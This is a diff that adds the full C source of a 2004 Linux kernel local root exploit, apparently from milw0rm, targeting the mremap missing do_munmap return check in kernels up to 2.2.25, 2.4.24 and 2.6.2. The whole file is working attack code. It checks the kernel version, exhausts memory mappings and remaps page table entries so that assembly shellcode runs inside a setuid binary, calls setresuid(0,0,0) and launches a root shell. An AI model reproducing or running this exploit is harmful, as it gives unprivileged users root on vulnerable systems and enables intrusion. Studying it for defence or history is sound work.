@@ -1,0 +1,300 @@
+/*
+ *
+ *	mremap missing do_munmap return check kernel exploit
+ *
+ *	gcc -O3 -static -fomit-frame-pointer mremap_pte.c -o mremap_pte
+ *	./mremap_pte [suid] [[shell]]
+ *	
+ *	Vulnerable kernel versions are all <= 2.2.25, <= 2.4.24 and <= 2.6.2
+ *
+ *	Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
+ *
+ *	THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
+ *	AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
+ *	WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <unistd.h>
+#include <syscall.h>
+#include <signal.h>
+#include <time.h>
+#include <sched.h>
+
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <sys/utsname.h>
+
+#include <asm/page.h>
+
+
+#define str(s) #s
+#define xstr(s) str(s)
+
+//	this is for standard kernels with 3/1 split
+#define STARTADDR	0x40000000
+#define PGD_SIZE	(PAGE_SIZE * 1024)
+#define VICTIM		(STARTADDR + PGD_SIZE)
+#define MMAP_BASE	(STARTADDR + 3*PGD_SIZE)
+
+#define DSIGNAL		SIGCHLD
+#define CLONEFL		(DSIGNAL|CLONE_VFORK|CLONE_VM)
+
+#define MREMAP_MAYMOVE	( (1UL) << 0 )
+#define MREMAP_FIXED	( (1UL) << 1 )
+
+#define __NR_sys_mremap	__NR_mremap
+
+
+//	how many ld.so pages? this is the .text section length (like cat 	
+//	/proc/self/maps) in pages
+#define LINKERPAGES	0x14
+
+//	suid victim
+static char *suid="/bin/ping";
+
+//	shell to start
+static char *launch="/bin/bash";
+
+
+_syscall5(ulong, sys_mremap, ulong, a, ulong, b, ulong, c, ulong, d, 		
+	  ulong, e);
+unsigned long sys_mremap(unsigned long addr, unsigned long old_len, 
+			 unsigned long new_len, unsigned long flags, 
+			 unsigned long new_addr);
+
+static volatile unsigned base, *t, cnt, old_esp, prot, victim=0;
+static int i, pid=0;
+static char *env[2], *argv[2];
+static ulong ret;
+
+
+//	code to appear inside the suid image
+static void suid_code(void)
+{
+__asm__(
+	"		call	callme				\n"
+
+//	setresuid(0, 0, 0), setresgid(0, 0, 0)
+	"jumpme:	xorl	%ebx, %ebx			\n"
+	"		xorl	%ecx, %ecx			\n"
+	"		xorl	%edx, %edx			\n"
+	"		xorl	%eax, %eax			\n"
+	"		mov	$"xstr(__NR_setresuid)", %al	\n"
+	"		int	$0x80				\n"
+	"		mov	$"xstr(__NR_setresgid)", %al	\n"
+	"		int	$0x80				\n"
+
+//	execve(launch)
+	"		popl	%ebx				\n"
+	"		andl	$0xfffff000, %ebx		\n"
+	"		xorl	%eax, %eax			\n"
+	"		pushl	%eax				\n"
+	"		movl	%esp, %edx			\n"
+	"		pushl	%ebx				\n"
+	"		movl	%esp, %ecx			\n"
+	"		mov	$"xstr(__NR_execve)", %al	\n"
+	"		int	$0x80				\n"
+
+//	exit
+	"		xorl	%eax, %eax			\n"
+	"		mov	$"xstr(__NR_exit)", %al		\n"
+	"		int	$0x80				\n"
+
+	"callme:	jmp	jumpme				\n"
+	);
+}
+
+
+static int suid_code_end(int v)
+{
+return v+1;
+}
+
+
+static inline void get_esp(void)
+{
+__asm__(
+	"		movl	%%esp, %%eax			\n"
+	"		andl	$0xfffff000, %%eax		\n"
+	"		movl	%%eax, %0			\n"
+	: : "m"(old_esp)
+	);
+}
+
+
+static inline void cloneme(void)
+{
+__asm__(
+	"		pusha					\n"
+	"		movl $("xstr(CLONEFL)"), %%ebx		\n"
+	"		movl %%esp, %%ecx			\n"
+	"		movl $"xstr(__NR_clone)", %%eax		\n"
+	"		int  $0x80				\n"
+	"		movl %%eax, %0				\n"
+	"		popa					\n"
+	: : "m"(pid)
+	);
+}
+
+
+static inline void my_execve(void)
+{
+__asm__(
+	"		movl %1, %%ebx				\n"
+	"		movl %2, %%ecx				\n"
+	"		movl %3, %%edx				\n"
+	"		movl $"xstr(__NR_execve)", %%eax	\n"
+	"		int  $0x80				\n"
+	: "=a"(ret)
+	: "m"(suid), "m"(argv), "m"(env)
+	);
+}
+
+
+static inline void pte_populate(unsigned addr)
+{
+unsigned r;
+char *ptr;
+
+	memset((void*)addr, 0x90, PAGE_SIZE);
+	r = ((unsigned)suid_code_end) - ((unsigned)suid_code);
+	ptr = (void*) (addr + PAGE_SIZE);
+	ptr -= r+1;
+	memcpy(ptr, suid_code, r);
+	memcpy((void*)addr, launch, strlen(launch)+1);
+}
+
+
+//	hit VMA limit & populate PTEs
+static void exhaust(void)
+{
+//	mmap PTE donor
+	t = mmap((void*)victim, PAGE_SIZE*(LINKERPAGES+3), PROT_READ|PROT_WRITE,
+		  MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
+	if(MAP_FAILED==t)
+		goto failed;
+
+//	prepare shell code pages
+	for(i=2; i<LINKERPAGES+1; i++)
+		pte_populate(victim + PAGE_SIZE*i);
+	i = mprotect((void*)victim, PAGE_SIZE*(LINKERPAGES+3), PROT_READ);
+	if(i)
+		goto failed;
+
+//	lock unmap
+	base = MMAP_BASE;
+	cnt = 0;
+	prot = PROT_READ;
+	printf("\n"); fflush(stdout);
+	for(;;) {
+		t = mmap((void*)base, PAGE_SIZE, prot, 
+			 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
+		if(MAP_FAILED==t) {
+			if(ENOMEM==errno)
+				break;
+			else
+				goto failed;
+		}
+		if( !(cnt%512) || cnt>65520 )
+			printf("\r    MMAP #%d  0x%.8x - 0x%.8lx", cnt, base,
+			base+PAGE_SIZE); fflush(stdout);
+		base += PAGE_SIZE;
+		prot ^= PROT_EXEC;
+		cnt++;
+	}
+
+//	move PTEs & populate page table cache
+	ret = sys_mremap(victim+PAGE_SIZE, LINKERPAGES*PAGE_SIZE, PAGE_SIZE,	
+			 MREMAP_FIXED|MREMAP_MAYMOVE, VICTIM);
+	if(-1==ret)
+		goto failed;
+
+	munmap((void*)MMAP_BASE, old_esp-MMAP_BASE);
+	t = mmap((void*)(old_esp-PGD_SIZE-PAGE_SIZE), PAGE_SIZE, 		
+		 PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 
+		 0);
+	if(MAP_FAILED==t)
+		goto failed;
+
+	*t = *((unsigned *)old_esp);
+	munmap((void*)VICTIM-PAGE_SIZE, old_esp-(VICTIM-PAGE_SIZE));
+	printf("\n[+] Success\n\n"); fflush(stdout);
+	return;
+
+failed:
+	printf("\n[-] Failed\n"); fflush(stdout);
+	_exit(0);
+}
+
+
+static inline void check_kver(void)
+{
+static struct utsname un;
+int a=0, b=0, c=0, v=0, e=0, n;
+
+	uname(&un);
+	n=sscanf(un.release, "%d.%d.%d", &a, &b, &c);
+	if(n!=3 || a!=2) {
+		printf("\n[-] invalid kernel version string\n");
+		_exit(0);
+	}
+
+	if(b==2) {
+		if(c<=25)
+			v=1;
+	}
+	else if(b==3) {
+		if(c<=99)
+			v=1;
+	}
+	else if(b==4) {
+		if(c>18 && c<=24)
+			v=1, e=1;
+		else if(c>24)
+			v=0, e=0;
+		else
+			v=1, e=0;
+	}
+	else if(b==5 && c<=75)
+		v=1, e=1;
+	else if(b==6 && c<=2)
+		v=1, e=1;
+
+	printf("\n[+] kernel %s  vulnerable: %s  exploitable %s",
+		un.release, v? "YES" : "NO", e? "YES" : "NO" );
+	fflush(stdout);
+
+	if(v && e)
+		return;
+	_exit(0);
+}
+
+
+int main(int ac, char **av)
+{
+//	prepare
+	check_kver();
+	memset(env, 0, sizeof(env));
+	memset(argv, 0, sizeof(argv));
+	if(ac>1) suid=av[1];
+	if(ac>2) launch=av[2];
+	argv[0] = suid;
+	get_esp();
+
+//	mmap & clone & execve
+	exhaust();
+	cloneme();
+	if(!pid) {
+		my_execve();
+	} else {
+		waitpid(pid, 0, 0);
+	}
+
+return 0;
+}
+
+// milw0rm.com [2004-03-01]
